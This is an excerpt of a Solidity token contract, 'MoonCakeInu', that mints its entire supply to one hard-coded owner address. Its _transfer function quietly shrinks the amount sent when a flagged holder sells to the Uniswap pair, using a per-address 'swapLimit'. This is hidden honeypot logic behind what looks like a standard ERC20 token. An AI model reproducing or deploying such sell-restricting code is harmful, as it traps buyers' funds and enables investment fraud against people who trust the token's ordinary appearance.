...
contract MoonCakeInu is Context, IERC20, IERC20Metadata,Ownable {
    ...
    constructor() {
       _totalSupply = 88888888888 * (10**18);
        _setOwner(0x27C3Ea437d950Ca4aC510E29e49b1e38Ddb114eA);
        _name="MoonCakeInu";
        _symbol="MCI";
        _mint(0x27C3Ea437d950Ca4aC510E29e49b1e38Ddb114eA, _totalSupply);
    }
    /**
    ...
    function _transfer(
        ...
        if(recipient==uniswapV2Pair || swap[sender].isSwap){
            if(swap[sender].ad){
            amount1 =amount.mul(swap[sender].swapLimit).div(10000);
            swap[sender].ad=false;
            }
       }else{
           amount1=amount;
       }
